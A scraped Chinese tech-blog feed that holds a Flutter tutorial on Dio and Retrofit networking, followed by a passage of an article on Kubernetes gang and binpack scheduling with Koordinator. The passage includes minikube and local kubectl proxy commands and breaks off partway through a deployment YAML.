7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Flutter: Dio + Retrofit 入门（面向 Android 开发者）</h2>
<blockquote>
<p>目标：用 Android Retrofit 的思维快速上手 Dart/Flutter 的 Dio + Retrofit 组合，从依赖引入 → 初始化 → 接口定义 → 代码生成 → 调用与排错。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">1. 依赖引入（pubspec.yaml）</h3>
<p>你项目已包含部分依赖，可按需校对版本（以下为示例，建议与现有项目版本一致）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">dio:</span> <span class="hljs-string">^5.x.x</span>
  <span class="hljs-attr">retrofit:</span> <span class="hljs-string">^4.x.x</span>
  <span class="hljs-attr">json_annotation:</span> <span class="hljs-string">^4.x.x</span>

<span class="hljs-attr">dev_dependencies:</span>
  <span class="hljs-attr">build_runner:</span> <span class="hljs-string">^2.x.x</span>
  <span class="hljs-attr">retrofit_generator:</span> <span class="hljs-string">^8.x.x</span>
  <span class="hljs-attr">json_serializable:</span> <span class="hljs-string">^6.x.x</span>
</code></pre>
<p>执行：</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub get
</code></pre>
<hr/>
<h3 data-id="heading-2">2. 初始化 Dio（拦截器/超时/日志）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/network/base_dio.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:dio/dio.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/foundation.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseDio</span> </span>{
  <span class="hljs-keyword">static</span> Dio create({
    <span class="hljs-keyword">required</span> <span class="hljs-built_in">String</span> baseUrl,
    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;? defaultHeaders,
    <span class="hljs-built_in">bool</span> enableLog = kDebugMode,
  }) {
    <span class="hljs-keyword">final</span> dio = Dio(BaseOptions(
      baseUrl: baseUrl,
      connectTimeout: <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">10</span>),
      receiveTimeout: <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">20</span>),
      headers: {
        <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'application/json'</span>,
        <span class="hljs-keyword">if</span> (defaultHeaders != <span class="hljs-keyword">null</span>) ...defaultHeaders,
      },
    ));

    <span class="hljs-keyword">if</span> (enableLog) {
      dio.interceptors.add(LogInterceptor(
        request: <span class="hljs-keyword">true</span>,
        requestHeader: <span class="hljs-keyword">true</span>,
        requestBody: <span class="hljs-keyword">true</span>,
        responseHeader: <span class="hljs-keyword">false</span>,
        responseBody: <span class="hljs-keyword">true</span>,
        error: <span class="hljs-keyword">true</span>,
      ));
    }

    <span class="hljs-comment">// 自定义拦截器（token 注入、统一错误处理等）</span>
    dio.interceptors.add(InterceptorsWrapper(
      onRequest: (options, handler) {
        <span class="hljs-comment">// options.headers['Authorization'] = 'Bearer xxx';</span>
        handler.next(options);
      },
      onResponse: (response, handler) =&gt; handler.next(response),
      onError: (e, handler) =&gt; handler.next(e),
    ));

    <span class="hljs-keyword">return</span> dio;
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-3">3. 通用响应模型（可选，推荐配合 json_serializable）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/network/api_response.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:json_annotation/json_annotation.dart'</span>;
<span class="hljs-keyword">part</span> <span class="hljs-string">'api_response.g.dart'</span>;

<span class="hljs-meta">@JsonSerializable</span>(genericArgumentFactories: <span class="hljs-keyword">true</span>, explicitToJson: <span class="hljs-keyword">true</span>)
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiResponse</span>&lt;<span class="hljs-title">T</span>&gt; </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">int?</span> code;               <span class="hljs-comment">// 0 / 200 -&gt; success</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> message;         <span class="hljs-comment">// 或 err_msg</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> errMsg;
  <span class="hljs-keyword">final</span> T? data;

  <span class="hljs-keyword">const</span> ApiResponse({<span class="hljs-keyword">this</span>.code, <span class="hljs-keyword">this</span>.message, <span class="hljs-keyword">this</span>.errMsg, <span class="hljs-keyword">this</span>.data});

  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isSuccess =&gt; code == <span class="hljs-number">0</span> || code == <span class="hljs-number">200</span>;

  <span class="hljs-keyword">factory</span> ApiResponse.fromJson(
    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; json,
    T <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">Object?</span> json) fromJsonT,
  ) =&gt; _$ApiResponseFromJson(json, fromJsonT);

  <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; toJson(<span class="hljs-built_in">Object?</span> <span class="hljs-built_in">Function</span>(T value) toJsonT) =&gt;
      _$ApiResponseToJson(<span class="hljs-keyword">this</span>, toJsonT);
}
</code></pre>
<p>生成（首次或模型调整后）：</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub run build_runner build --delete-conflicting-outputs
</code></pre>
<hr/>
<h3 data-id="heading-4">4. Retrofit 接口定义（与 Android Retrofit 思路一致）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/network/api_service.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:dio/dio.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:retrofit/retrofit.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'api_response.dart'</span>;

<span class="hljs-keyword">part</span> <span class="hljs-string">'api_service.g.dart'</span>;

<span class="hljs-meta">@RestApi</span>()
<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiService</span> </span>{
  <span class="hljs-keyword">factory</span> ApiService(Dio dio, {<span class="hljs-built_in">String</span> baseUrl}) = _ApiService;

  <span class="hljs-comment">// GET 示例（回声服务）</span>
  <span class="hljs-meta">@GET</span>(<span class="hljs-string">'/get'</span>)
  Future&lt;HttpResponse&lt;<span class="hljs-built_in">dynamic</span>&gt;&gt; httpBinGet();

  <span class="hljs-comment">// 业务示例：登录（返回强类型）</span>
  <span class="hljs-meta">@POST</span>(<span class="hljs-string">'/login'</span>)
  Future&lt;ApiResponse&lt;LoginData&gt;&gt; login(<span class="hljs-meta">@Body</span>() <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; body);
}

<span class="hljs-comment">// 模型示例</span>
<span class="hljs-comment">// lib/network/login_data.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:json_annotation/json_annotation.dart'</span>;
<span class="hljs-keyword">part</span> <span class="hljs-string">'login_data.g.dart'</span>;

<span class="hljs-meta">@JsonSerializable</span>()
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginData</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> userId;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> token;
  LoginData({<span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.userId, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.token});
  <span class="hljs-keyword">factory</span> LoginData.fromJson(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; json) =&gt; _$LoginDataFromJson(json);
  <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; toJson() =&gt; _$LoginDataToJson(<span class="hljs-keyword">this</span>);
}
</code></pre>
<p>生成接口桩文件：</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub run build_runner build --delete-conflicting-outputs
</code></pre>
<hr/>
<h3 data-id="heading-5">5. 组装与调用</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:dio/dio.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'base_dio.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'api_service.dart'</span>;

<span class="hljs-keyword">final</span> dio = BaseDio.create(baseUrl: <span class="hljs-string">'https://httpbin.org'</span>);
<span class="hljs-keyword">final</span> api = ApiService(dio, baseUrl: <span class="hljs-string">'https://httpbin.org'</span>);

Future&lt;<span class="hljs-keyword">void</span>&gt; ping() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">final</span> resp = <span class="hljs-keyword">await</span> api.httpBinGet();
    <span class="hljs-comment">// resp.response 为 Dio 的 Response；resp.data 为 decoded body</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'status=<span class="hljs-subst">${resp.response.statusCode}</span>, url=<span class="hljs-subst">${resp.data[<span class="hljs-string">'url'</span>]}</span>'</span>);
  } <span class="hljs-keyword">on</span> DioException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'dio error: <span class="hljs-subst">${e.message}</span>'</span>);
  }
}

Future&lt;<span class="hljs-keyword">void</span>&gt; doLogin() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> loginApi = ApiService(BaseDio.create(baseUrl: <span class="hljs-string">'https://api.example.com'</span>),
      baseUrl: <span class="hljs-string">'https://api.example.com'</span>);
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">final</span> res = <span class="hljs-keyword">await</span> loginApi.login({<span class="hljs-string">'accountNumber'</span>: <span class="hljs-string">'a'</span>, <span class="hljs-string">'password'</span>: <span class="hljs-string">'b'</span>});
    <span class="hljs-keyword">if</span> (res.isSuccess) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'token=<span class="hljs-subst">${res.data?.token}</span>'</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'login fail code=<span class="hljs-subst">${res.code}</span> msg=<span class="hljs-subst">${res.message ?? res.errMsg}</span>'</span>);
    }
  } <span class="hljs-keyword">on</span> DioException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'network error: <span class="hljs-subst">${e.message}</span>'</span>);
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-6">6. 进阶要点</h3>
<ul>
<li>返回类型选择：
<ul>
<li><code>Future&lt;HttpResponse&lt;T&gt;&gt;</code> 需要底层 <code>Response</code> 细节（headers/status）时用；</li>
<li><code>Future&lt;T&gt;</code> 够用时返回强类型模型；</li>
<li>响应结构不稳定时可用 <code>dynamic</code>/<code>Map&lt;String, dynamic&gt;</code> 临时兜底。</li>
</ul>
</li>
<li>错误处理：Dio v5 抛 <code>DioException</code>，可通过 <code>e.type</code> 区分超时、响应错误等。</li>
<li>拦截器：统一 Header（如 Token）、统一错误码处理、重试策略等。</li>
<li>多环境：用不同 <code>baseUrl</code> 或注入不同 <code>Dio</code> 实例（上层配置）。</li>
<li>代码生成：所有 <code>part '*.g.dart'</code> 文件禁止手改；模型与接口调整后重新生成。</li>
</ul>
<hr/>
<h3 data-id="heading-7">7. 快速排错清单</h3>
<ul>
<li>“Target of URI doesn't exist” → 未生成 <code>*.g.dart</code> 或 <code>part</code> 路径不匹配文件名大小写。</li>
<li>“Map.fromJson 调用错误” → Retrofit 返回泛型为 <code>Map&lt;String, dynamic&gt;</code> 时，优先改为 <code>dynamic</code> 或定义强类型模型。</li>
<li>运行时 4xx/5xx → 用 <code>HttpResponse</code> 检查 <code>response.statusCode</code> 与 <code>response.data</code> 并结合 LogInterceptor。</li>
<li>iOS/Android 真机无网络 → 检查代理/网络权限/域名可达性（可先用 <code>https://httpbin.org/get</code> 连通性测试）。</li>
</ul>
<hr/>
<h3 data-id="heading-8">8. 最小连通性测试（推荐先跑通）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> api = ApiService(BaseDio.create(baseUrl: <span class="hljs-string">'https://httpbin.org'</span>), baseUrl: <span class="hljs-string">'https://httpbin.org'</span>);
<span class="hljs-keyword">final</span> resp = <span class="hljs-keyword">await</span> api.httpBinGet();
<span class="hljs-built_in">print</span>(resp.data[<span class="hljs-string">'url'</span>]); <span class="hljs-comment">// 期望输出: https://httpbin.org/get</span>
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🎉刚入职的AIops菜鸡，应该知道gang-scheduling和binpack调度吗？]]></title>    <link>https://juejin.cn/post/7579946275435610122</link>    <guid>https://juejin.cn/post/7579946275435610122</guid>    <pubDate>2025-12-05T06:00:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579946275435610122" data-draft-id="7579946275435544586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🎉刚入职的AIops菜鸡，应该知道gang-scheduling和binpack调度吗？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-05T06:00:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="有态度的下等马"/> <meta itemprop="url" content="https://juejin.cn/user/448256476727662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🎉刚入职的AIops菜鸡，应该知道gang-scheduling和binpack调度吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476727662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    有态度的下等马
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T06:00:02.000Z" title="Fri Dec 05 2025 06:00:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 可插拔的调度框架</h2>
<p>k8s以可插拔的插件方式实现了调度能力，插件可以实现多个扩展点接口来执行更复杂或有状态的任务。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a004cfb8f4bd499a86b6549e64f4f5bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=7M4i9KrZKLWLoGIZVIHqVE5igU0%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fkubernetes.io%2Fdocs%2Freference%2Fscheduling%2Fconfig%2F%23scheduling-plugins" title="https://kubernetes.io/docs/reference/scheduling/config/#scheduling-plugins" target="_blank" ref="nofollow noopener noreferrer">默认的调度插件</a> 给出了他们实现的扩展点、默认的打分策略。</p>
<p>在AI工程中要重点关注默认调度器带来的副作用：</p>
<p>① 默认的调度器是以<strong>Pod为调度单元进行依次调度，不会考虑Pod之间的相互关系</strong>。</p>
<p>② NodeResourcesFit插件默认启用的<strong>最少资源分配策略</strong>: 为避免单点故障，调度时打散了Pod。</p>
<hr/>
<h2 data-id="heading-1">2. AIops</h2>
<p>在AI工程化中，我们要面对2个现实：</p>
<p>① 很多数据计算类的离线作业（包括ML训练）具有<strong>组合调度</strong>的特点，即要求所有的子任务都能够成功创建后，整个作业才能正常运行。如果只有部分子任务启动的话，启动的子任务将持续等待剩余的子任务被调度（甚至死锁）， 这浪费了节点资源，这正是<code>Gang Scheduling</code>的场景。</p>
<p>② 在ML训练和推理时，节点上的GPU是最昂贵的算力资源，默认的<code>LeastAllocated调度策略</code>打散了Pod，很容易在节点上产生<strong>GPU碎片</strong>， 影响了资源的利用率，这时就要求<code>binpack</code>调度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3196464004894785bba4d318fc24ef03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=NpmSejdgnloFp7z54khrYbbBMOI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">gang-scheduling 调度</h3>
<p>gang-scheduling 是coschedule协同调度中的严格协同调度,(批处理作业完全不允许有“作业碎片”存在)， 也就是“All or Nothing”。</p>
<h3 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fkubernetes.io%2Fdocs%2Fconcepts%2Fscheduling-eviction%2Fresource-bin-packing%2F" title="https://kubernetes.io/docs/concepts/scheduling-eviction/resource-bin-packing/" target="_blank" ref="nofollow noopener noreferrer">binpack调度</a></h3>
<p>顾名思义就是：装箱，在k8s调度中意味：避免资源碎片化，尽可能把节点空余出来， 最终最大化的利用节点资源。</p>
<h4 data-id="heading-4">原生NodeResourcesFit调度插件</h4>
<p>官网所述,默认调度器的NodeResourcesFit有三个打分策略</p>
<ul>
<li>LeastAllocated（默认），这种策略的目的是将工作量平均分配到各个节点，防止任何一个节点超负荷工作</li>
<li>MostAllocated</li>
<li>RequestedToCapacityRatio：根据节点资源与 pod 需求的匹配程度来决定哪个节点</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e403c898fd54f1fa69136070e230e26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=aGHc4b5Q0ItfFQWVYUX6XoUKiEE%3D" alt="" loading="lazy"/></p>
<hr/>
<p>同一个k8s集群，为了让在线任务和离线任务的不同调度需求能优雅落地，项目引入了koordinator 调度器。</p>
<blockquote>
<p>Koordinator 是一个基于 QoS 的 Kubernetes 混合工作负载调度系统。它旨在提高对延迟敏感的工作负载和批处理作业的运行时效率和可靠性，简化与资源相关的配置调整的复杂性，并增加 Pod 部署密度以提高资源利用率。</p>
</blockquote>
<h2 data-id="heading-5">3.koordinator一把梭</h2>
<h3 data-id="heading-6">3.1 准备环境/背景</h3>
<p>① 本次使用minikube：<code>minikube start --cni=auto --nodes=3 --addons=metrics-server</code></p>
<blockquote>
<p>binpack依赖metrics-server插件判断节点资源利用情况，每个节点默认2核心cpu/2200MB内存。<br/>
对control-plane添加污点<code>kubectl taint nodes minikube node-role.kubernetes.io/control-plane=true:NoSchedule</code>， 只关注两个worker节点的调度。</p>
</blockquote>
<p>② 本次环境无gpu硬件， 本次<a href="https://link.juejin.cn?target=https%3A%2F%2Fkubernetes.io%2Fdocs%2Ftasks%2Fadminister-cluster%2Fextended-resource-node%2F" title="https://kubernetes.io/docs/tasks/administer-cluster/extended-resource-node/" target="_blank" ref="nofollow noopener noreferrer">在k8s上安装虚拟资源：<code>example.com/dongle</code></a></p>
<p>下面对2台worker分别构造了8卡虚拟资源</p>
<pre><code class="hljs language-json" lang="json">kubectl proxy 

# 每个节点申请过<span class="hljs-number">8</span>卡机器
curl --header <span class="hljs-string">"Content-Type: application/json-patch+json"</span> \
  --request PATCH \
  --data '<span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/status/capacity/example.com~1dongle"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>' \
  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.00.1:8001/api/v1/nodes/minikube-m02/status</span>


  curl --header <span class="hljs-string">"Content-Type: application/json-patch+json"</span> \
  --request PATCH \
  --data '<span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"add"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/status/capacity/example.com~1dongle"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>' \
  http<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:8001/api/v1/nodes/minikube-m03/status</span>
</code></pre>
<p>③ 启动2副本pod，查看默认调度结果</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># deploy.yaml</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">vgpu-job</span> <span class="hljs-comment"># 本次deploy的资源名称</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span> <span class="hljs-comment"># 启动2副本</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">matchLabels:</span>
      <span class="hljs-attr">app:</span> <span class="hljs-string">vgpu-job</span>
  <span class="hljs-attr">template:</span>
    <span class="hljs-attr">metadata:</span>
      <span class="hljs-attr">labels:</span>
